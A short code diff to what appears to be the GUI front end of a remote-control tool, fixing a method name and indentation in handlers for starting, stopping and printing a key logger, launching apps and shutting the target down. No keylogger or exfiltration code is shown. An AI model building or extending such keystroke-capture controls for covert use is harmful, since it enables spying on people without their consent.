@@ -71,7 +71,7 @@ def main():
             print(value[1])
             client.start_app(value[1])
         elif event == "Start Key Logger":
-            client.start_key_logger()
+            client.start_keylogger()
         elif event == "Stop Key Logger":
             client.stop_keylogger()
         elif event == "Print Key Logger":
@@ -84,10 +84,9 @@ def main():
             window['OUTPUT'].Update('')
             results = client.shutdown()
             window['OUTPUT'].update(value=results)
-            
 
     window.close()
 
 
 if __name__ == '__main__':
-  main()
+    main()
